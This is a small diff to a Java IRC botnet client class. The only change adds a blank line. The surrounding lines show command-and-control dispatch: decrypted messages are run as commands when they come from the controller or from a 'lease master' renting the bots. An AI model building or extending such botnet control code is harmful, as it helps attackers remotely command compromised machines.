@@ -108,6 +108,7 @@ public class BotnetClient extends PircBot {
 		System.out.println("m2: " + leasedDecMsg);
 		String command = decMsg != null && decMsg.split(" ").length > 0 ? decMsg.split(" ")[0] : decMsg;
 		String leasedCommand = leasedDecMsg != null && leasedDecMsg.split(" ").length > 0 ? leasedDecMsg.split(" ")[0] : leasedDecMsg;
+		
 		if (sender.equals(CC) && COMMANDS.contains(command)) {
 			runCommand(decMsg, hostname, sender);
 		} else if (leaseMaster != null && sender.equals(leaseMaster) && SAFE_COMMANDS.contains(leasedCommand)) {
